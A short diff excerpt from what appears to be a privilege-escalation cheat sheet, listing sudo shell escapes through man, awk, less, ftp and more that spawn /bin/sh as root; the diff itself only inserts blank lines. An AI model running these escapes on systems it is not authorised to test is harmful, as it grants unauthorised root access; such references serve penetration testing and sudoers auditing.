@@ -152,11 +152,15 @@ nano
 
 man
 <code>sudo man</code>followed by <code>!/bin/sh</code>
+
 awk
 <code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
+
 less
 <code>sudo less /etc/profile followed by !/bin/sh</code>
+
 ftp
 <code>sudo ftp</code>followed by <code>!/bin/sh</code>
+
 more
 <code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
